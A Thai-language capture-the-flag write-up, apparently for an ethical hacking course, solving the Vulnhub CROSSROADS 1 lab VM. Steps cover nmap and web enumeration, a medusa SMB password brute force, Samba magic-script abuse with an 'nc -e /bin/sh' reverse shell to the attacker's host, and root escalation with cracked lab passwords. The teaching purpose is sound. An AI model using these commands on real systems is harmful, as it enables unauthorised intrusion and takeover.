# 1308 (Ethical Hacking and Penetration Testing)

บทความนี้เป็นการทดสอบการทำ Penetration testing เพื่อใช้ทดสอบการเจาะระบบสำหรับคนที่สนใจทางด้านของการเจาะระบบ และ เพื่อใช้ประกอบการเรียนการสอนวิชา Ethical Hacking ภาควิชา Network Engineering and Cybersecurity โดยการทดลองนี้จะใช้ VirtualBox
## CROSSROADS 1 Vulnhub Writeup
## เป้าหมาย
> ใช้วิธีอะไรก็ได้เพื่อให้สามารถเจาะเข้าเครื่อง Server และได้รับสิทธิ์เป็น Root และได้ flag ครบทั้ง 2 ตัว
## การติดตั้ง
> https://www.vulnhub.com/entry/crossroads-1,659/

> https://download.vulnhub.com/crossroads/crossroads_vh.ova
## การสร้าง Folder 
> สร้าง Folder ที่ไว้จัดเก็บ file สามารถเลือกสร้างไว้ที่ใดก็ได้ แต่ในตัวอย่างจะเป็นการจัดเก็บไว้ที่ส่วนของ Desktop 

```
  $ sudo su
  # cd Desktop
  # mkdir crossroads
```
![image](https://user-images.githubusercontent.com/87358973/211530778-b7979e1d-da40-41d0-9aae-d0d95c6ee699.png)

# 1.	Identify the target : ระบุเป้าหมาย
> ใช้คำสั่ง netdiscover เพื่อตรวจสอบ Mac Address ทุกเครื่องในระบบเครือข่าย เพื่อค้นหาเป้าหมายที่เราต้องการ
```
# netdiscover
# netdiscover -i eth0 
```
![image](https://user-images.githubusercontent.com/87358973/211531820-ea77535d-2c0c-4a4b-bc1b-be6d56e98544.png)

# 2.	Scan open ports : ตรวจสอบ Port ที่มีการเปิดอยู่
## ขั้นตอนที่ 2.1
> เมื่อเราเจอเป้าหมายที่เราต้องการแล้ว ให้ใช้คำสั่ง nmap ทำการสแกนหมายเลข IP เพื่อดูว่าเป้าหมายที่เราต้องการนั้นเปิด port อะไรไว้บ้าง 
```
# nmap 192.168.56.108
# nmap -A -T4 -p- 192.168.56.108
```
> จากที่เราได้ใช้คำสั่ง nmap ในการสแกนนั้น จะเห็นได้ว่า เครื่องเป้าหมายได้เปิด port 80, 139 และ 445

![image](https://user-images.githubusercontent.com/87358973/211533598-7eca53f4-f1e7-48bb-a7e8-d88cbf700887.png)

## ขั้นตอนที่ 2.2
> เมื่อเรารู้แล้วว่าเครื่องเป้าหมายเปิด port 80 เราจะทำการเช็คหน้าเว็บไซต์ โดยการนำหมายเลข ip ที่ได้มาใส่ http://192.168.56.108/

![image](https://user-images.githubusercontent.com/87358973/211533890-e62cfb3d-1017-4b3e-af0a-2bec0683dae8.png)

# 3.	Enumerate web server
## ขั้นตอนที่ 3.1
> เมื่อทำการเช็คหน้าเว็บไซต์แล้ว ให้ใช้คำสั่ง dirb แล้วตามด้วย http://192.168.56.108/ เพื่อสแกนไปที่เว็บเซิร์ฟเวอร์ของเครื่องเป้าหมาย เพื่อที่เราจะหา file directory ที่เราต้องการ 
``` 
# dirb http://192.168.56.108/ 
```
![image](https://user-images.githubusercontent.com/87358973/211534414-901c4fd7-b4ab-4dfb-bafa-d8445e27a9bc.png)

## ขั้นตอนที่ 3.2
> เมื่อเราเจอ file ที่เราต้องการแล้ว(ในที่นี้เราจะเลือกเปิดไฟล์ robots.txt ) ให้เราค้นหาไฟล์ที่เราได้มา โดยการใส่ http://192.168.1.149/robots.txt

![image](https://user-images.githubusercontent.com/87358973/211534545-739b099c-699c-4bc2-8566-1e81774061da.png)

> เราจะลองเข้าไปที่ path /crossroads.png ที่ได้มาจาก robots.txt ไปค้นหา http://192.168.56.108/crossroads.png ก็จะได้ file รูปภาพ 

![image](https://user-images.githubusercontent.com/87358973/211534642-17ff93b4-2aa2-43de-b9a6-73d45a8815e4.png)

## ขั้นตอนที่ 3.3
> เนื่องจากเราไม่ได้ข้อมูลเพิ่มเติม จากขั้นตอนที่ 2 เราจึงใช้ gobuster
   
```
# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.56.108/ -x php,txt,html,bak 
```
> นำ Path /usr/share/dirb/wordlists/common.txt เราจะได้มาการแสกน 

![image](https://user-images.githubusercontent.com/87358973/211535499-ef2e7f09-a479-4439-a424-a47d00f3c36c.png)
#### จากรูปนี้ จะเลือกดูเฉพาะ Status : 200

## ขั้นตอนที่ 3.4
> เราจะเลือกไปที่ /note.txt แล้วนำไป search จะเห็นได้ว่าเราได้ข้อความ หรือ keyword บางอย่างมาจาก http://192.168.56.108/note.txt

![image](https://user-images.githubusercontent.com/87358973/211535917-f1257580-da2a-4c22-8a0b-998357db2637.png)

> keyword ที่เราได้คือ just find three kings of blues then move to the crossroads จากนั้นนำ keyword ไปค้นหา ก็จะได้ https://12bar.de/cms/albums/three-kings-of-blues/

![image](https://user-images.githubusercontent.com/87358973/211536009-a050de86-d2fe-4cec-8db4-0b03016bb61c.png)

# 4.	Enumerate SMB server
## ขั้นตอนที่ 4.1
> จากขั้นตอนที่ได้ทำมาก่อนหน้านี้ จะเห็นได้ว่า port 80 ที่เราได้ทำการหาข้อมูลไปนั้น มันสิ้นสุดตรง keyword ที่เราได้มา ดังนั้นเราจะมุ่งเป้าไปที่ port 139 ซึ่งเป็นโปรโตคอล SMB เราจึงจะใช้คำสั่ง smbmap เพื่อดูการอนุญาตการเข้าถึงต่างๆ 

```
# smbmap -H 192.168.56.108
```
![image](https://user-images.githubusercontent.com/87358973/211542196-c83de3b0-a3f6-4b2a-92e7-c55e04257ec5.png)

## ขั้นตอนที่ 4.2 
> เราจะใช้ enum4linux เพื่อดูว่าเป้าหมายของเรานั้นมีอะไรบ้าง ที่อาจจะตรงกับ keyword ที่เราได้มา
``` 
# enum4linux -a 192.168.56.108 
```
![image](https://user-images.githubusercontent.com/87358973/211542451-a000218f-2eb6-464e-a54a-da246335efb1.png)
> เมื่อใช้คำสั่งดังกล่าวแล้ว จะเห็นได้ว่า user ตรงกับ keyword ที่เราหามาได้

## ขั้นตอนที่ 4.3
> เมื่อเราได้ user มาแล้วจะขาด password เราจึงใช้ medusa ซึ่งใน kali จะจัดเก็บ wordlist ไว้ที่ path /usr/share/wordlists/rockyou.txt
 
```
# medusa -h 192.168.56.108 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt
```
![image](https://user-images.githubusercontent.com/87358973/211542674-fa85acdf-1a65-4d50-80e3-7889337bef87.png)
> จะเห็นได้ว่า เราไม่สามารถเปิด file rockyou.txt ได้ และดันขึ้นว่า Failed to open นั่นหมายความว่าเราจะต้อง unzip file ก่อน คำสั่งที่ใช้ unzip file คือ `gunzip rockyou.txt.gz`

![image](https://user-images.githubusercontent.com/87358973/211542843-ae66df30-51c4-4274-a88a-46393f5061c0.png)
> หากทำการ unzip file แล้ว ให้ใช้คำสั่ง medusa  `# medusa -h 192.168.56.108 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt` อีกครั้งแล้วจะได้ Password: bradley1 มา 

![image](https://user-images.githubusercontent.com/87358973/211545075-15f0a5e8-bd17-4c84-8af7-9a867f450698.png)

## ขั้นตอนที่ 4.4
> เมื่อเราได้ password มาแล้วลอง smbmap เช็คอีกครั้งโดยใส่ password ที่เราได้มาลงไปด้วย 
```
# smbmap -H 192.168.56.108 -u albert -p bradley1
```
![image](https://user-images.githubusercontent.com/87358973/211545527-81242a39-d0b1-49b8-a597-1d7753a80db0.png)
> จะเห็นได้ว่าเมื่อเราได้ Password มาแล้วนั้น จะมีการอนุญาตให้เข้าถึง แตกต่างจากตอนแรก ที่ขึ้นว่า **_NO ACCESS_**

# 5.	Log into the shares
## ขั้นตอนที่ 5.1
> จากนั้นเราจะใช้ smbclient ในการเข้าไปที่เครื่องเป้าหมาย แต่จะต้องอยู่ใน path ที่เราได้ทำการสร้าง folder ไว้ เพราะเราจะทำการ get ไฟล์จากเครื่องเป้าหมายมาไว้ที่เครื่องเรา
```
# smbclient //192.168.56.108/albert -U albert
```
> จากนั้นให้ใส่ Password: bradley1 ตามที่เราได้มา

![image](https://user-images.githubusercontent.com/87358973/211547099-3496bee2-e08e-402e-8f95-2d201fa21664.png)

> หลังจากที่เราได้ใช้คำสั่ง `smbclient //192.168.56.108/albert -U albert` และได้ใส่ **_Password: bradley1_** ไปเรียบร้อยแล้วนั้น เราก็จะเข้ามาอยู่ที่ตัว smb ที่เป็น client จากนั้นใช้คำสั่ง ls เพื่อดูรายการไฟล์ทั้งหมด และทำการ get file ที่เราต้องการ เข้ามาในเครื่องของเราเอง 

![image](https://user-images.githubusercontent.com/87358973/211547508-24eca449-0846-4b28-87e0-c7c34b8c765a.png)

> ในที่นี้เราจะ get file crossroads.png, beroot และ user.txt 
```
smb: \> get crossroads.png
smb: \> get beroot
smb: \> get user.txt
```
![image](https://user-images.githubusercontent.com/87358973/211548298-68851432-a7d8-4e3d-999f-49d2ef575f71.png)

## ขั้นตอนที่ 5.2 
>หลังจากที่เรา get file จากเครื่องเป้าหมายมาแล้ว ลอง cat ดูข้อมูลภายในไฟล์ที่เราได้มาเราจะเลือกเป็นไฟล์ user.txt จะเห็นได้ว่าเราได้ข้อมูลที่เป็น flag ที่ 1 มา แต่เรายังไม่สารถเข้าถึงสิทธิ์ root ได้ ดังรูป 
```
# ls 
# cat user.txt
```
## ขั้นตอนที่ 5.3
> เมื่อเราได้ flag ที่ 1 มาแล้ว แต่ข้อมูลของเรานั้นยังไม่เพียงพอ เนื่องจากยังไม่สามารถเข้าถึงสิทธิ์ root ได้ จึงต้องกลับไปที่ smb เพื่อเข้าไปดู **_folder > smbshare_** ว่ายังมีข้อมูลอะไรอีกบ้าง 

> และเข้ามายัง **_folder > smbshare_** แล้วเราก็เจอ **_file smb.conf_** จากนั้นให้ **_get file smb.conf_** กลับไปที่เครื่องของเรา	
```
smb: \> cd smbshare\
smb: \smbshare\> ls
smb: \smbshare\> get smb.conf
```
![image](https://user-images.githubusercontent.com/87358973/211549325-10e4d5f7-6e4e-4b77-a063-1b6eab143e2e.png)

## ขั้นตอนที่ 5.4
> เมื่อเราได้ file smb.conf มาเรียบร้อยแล้ว ให้ใช้คำสั่ง cat เพื่อแสดงข้อมูลที่อยู่ภายใน file ดังรูป
```
# cat smb.conf
```
![image](https://user-images.githubusercontent.com/87358973/211549403-fa3d606e-b946-4120-afd3-42514b537f30.png)
> สังเกตได้ว่าตรง magic script นั้น ใช้ไฟล์เป็น .shจึงจะมีการทำ shell ไปที่เครื่อง crossroads

## ขั้นตอนที่ 5.5
> เราจะทำการสร้างไฟล์ .sh เพื่อนำเข้าไป run ที่เครื่อง crossroads
```
	# touch smbscript.sh
	# vim smbscript.sh
```
> เมื่อเราเข้าไปใน vim smbscript.sh แล้ว ให้ทำการใส่ข้อมูลลงไป 

![image](https://user-images.githubusercontent.com/87358973/211549586-d643900a-e220-4905-97aa-ad5aa2866d65.png)
> nc -e /bin/sh (IP เครื่องตัวเอง) (port อะไรก็ได้) เพื่อสร้าง reverse shell ให้กับเครื่องผู้โจมตี

## ขั้นตอนที่ 5.6
> เราจะทำการเปิด terminal ขึ้นมาสองหน้าโดยที่หน้าที่ 1.จะใช้ คำสั่ง `# nc -vnlp  8787  port` เพื่อเชื่อมต่อกับเครื่อง client และอีก

> หน้าที 2. `# smbclient //192.168.56.108/smbshare -U albert` ใส่ **_Password: bradley1_** เพื่อเข้ายัง **_path /smbshare_** แล้วทำการ **_put smbscript.sh_** เข้าไปที่เครื่อง client ที่มีการเขียน script ในการเชื่อมต่อเอาไว้
![image](https://user-images.githubusercontent.com/87358973/211550520-f49260af-777e-4165-a627-cf0e7e6a56bf.png)

# 6.	Beroot
## ขั้นตอนที่ 6.1
> เมื่อเข้ามายังเครื่องเป้าหมายได้แล้ว ให้ใช้คำสั่ง ls เพื่อดูรายการ file 

![image](https://user-images.githubusercontent.com/87358973/211550739-5fb71608-8d42-4cc3-8212-7c894d9d4767.png)

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; 
```
>เพื่อสแกน system สำหรับ file และตรวจสอบสิทธิ์ **_user : albert _**

![image](https://user-images.githubusercontent.com/87358973/211550793-c82e69ba-dc5e-4ccf-b0b8-27cc6caddf8b.png)

## ขั้นตอนที่ 6.2
> เราจะเห็น path /home/albert/beroot จึงทำการ cat เพื่อดูข้อมูลในไฟล์ beroot ภายในไฟล์จะมีข้อมูล /bin/bash /root/beroot.sh เป็น path ของโปรแกรมจาก root จะได้ผลลัพธ์ 

![image](https://user-images.githubusercontent.com/87358973/211550988-510e560b-b550-4c8f-b206-b15fb1ecea25.png)

## ขั้นตอนที่ 6.3
> จากนั้นเราลองเข้าไปที่ path ./beroot แต่ว่า ./beroot นั้นติด password

![image](https://user-images.githubusercontent.com/87358973/211551046-f5dc0980-4da6-4682-b26a-400eaa3ed4ed.png)

## ขั้นตอนที่ 6.4
> เราต้องหา password ในการเข้า ./beroot จึงเลือกใช้ stegoveritas ในการค้นหาข้อมูลในรูป crossroads.png 
```
# stegoveritas crossroads.png
```
![image](https://user-images.githubusercontent.com/87358973/211551238-514492ba-ac33-483d-ac81-3704890d605d.png)

## ขั้นตอนที่ 6.5
> หลังจากนั้นเราจะได้ไฟล์ results เพิ่มเข้ามา 
```
# ls
# cd results
# ls
# cd keepers
# ls
```
![image](https://user-images.githubusercontent.com/87358973/211551284-09edc487-efa1-4144-a9ab-e37b4a5100de.png)

## ขั้นตอนที่ 6.6
> จะเห็นได้ว่า จากขั้นตอนที่ 6.5 นั้น เราได้ file ที่เป็นค่า hash มาหลาย file ให้เราใช้คำสั่ง cat แล้วตามด้วย file ที่เราต้องการ 
```
# cat 1671911813.7172303-a5e0b5d6d6fa8b90113a5ef4fdd1dc5a
```
![image](https://user-images.githubusercontent.com/87358973/211551515-bb279828-7650-4625-983b-1101a7229c3f.png)

## ขั้นตอนที่ 6.7
> จากนั้นทำการ copy ข้อมูลในไฟล์ที่เราได้มาลงที่ไฟล์ใหม่ passwd.txt
```
# cp 1671911813.7172303-a5e0b5d6d6fa8b90113a5ef4fdd1dc5a ../../passwd.txt
```
![image](https://user-images.githubusercontent.com/87358973/211551588-39da23dd-03ed-4f2a-afe3-e4ae69a78bc1.png)
![image](https://user-images.githubusercontent.com/87358973/211551609-3d83acf3-00e3-4511-abae-c31aa3be43c2.png)


## ขั้นตอนที่ 6.8
> เปิด port 80 เพื่อทำการนำไฟล์ passwd.txt เข้าไปยังเครื่องเป้าหมาย ดังรูป
```
# python3 -m http.server 80
```
![image](https://user-images.githubusercontent.com/87358973/211551690-d336fcf0-b0bb-43e2-88e1-c33c76cc139d.png)
> จากนั้นเปิด terminal ขึ้นมาอีกหน้า เพื่อทำการดาวน์โหลด passwd.txt ลงบนเครื่องเป้าหมาย 
```
$ wget 192.168.56.109/passwd.txt
```
![image](https://user-images.githubusercontent.com/87358973/211551757-1544d5df-7029-485d-927d-932c67a365ca.png)

## ขั้นตอนที่ 6.9
> ทำ `for i in $(cat passwd.txt); do echo $i | ./beroot; done` เพื่อหา location ของ password จากนั้นใช้คำสั่ง ls จะเห็นว่ามี file ใหม่เพิ่มเข้ามา นั่นก็คือ rootcreds `albert@crossroads:/home/albert$ ls`

![image](https://user-images.githubusercontent.com/87358973/211552090-206b835d-b46a-4d30-a6ff-c640147f9462.png)

ขั้นตอนที่ 6.10
> เมื่อได้ file ที่ชื่อว่า rootcreds มาแล้ว ให้ใช้คำสั่ง `cat albert@crossroads:/home/albert$ cat rootcreds` จากนั้นเราจะได้ password จากไฟล์ rootcreds 
```
**Password : ___drifting___**
```
![image](https://user-images.githubusercontent.com/87358973/211552351-f49f0dad-d9a1-4cdf-81f0-1993a4128a50.png)

## ขั้นตอนที่ 6.11
> เมื่อได้รหัสผ่านของ root มาแล้ว ให้เข้าไปยัง path ของ root จากนั้นนำ password ที่ได้มาใส่ ก็จะเข้าสู่ root ซึ่งเป็นสิทธิ์สูงสุด จากนั้นใช้คำสั่ง ls เพื่อดูรายการ file จากนั้น cat file ที่ต้องการ แล้วก็จะได้ flag ที่ 2 มา 
```
albert@crossroads:/home/albert$ su root
Password: ___drifting___
root@crossroads:/home/albert# id
uid=0(root) gid=0(root) groups=0(root)
root@crossroads:/home/albert# cd /root
root@crossroads:~# ls
beroot.sh  creds  passwd  root.txt
root@crossroads:~# cat root.txt
```
> เมื่อใช้คำสั่งข้างต้นแล้วจะได้ผลลัพธ์ ดังรูป

![image](https://user-images.githubusercontent.com/87358973/211552794-4d1616cc-9195-4fbc-9ec0-fd1310325cf1.png)



















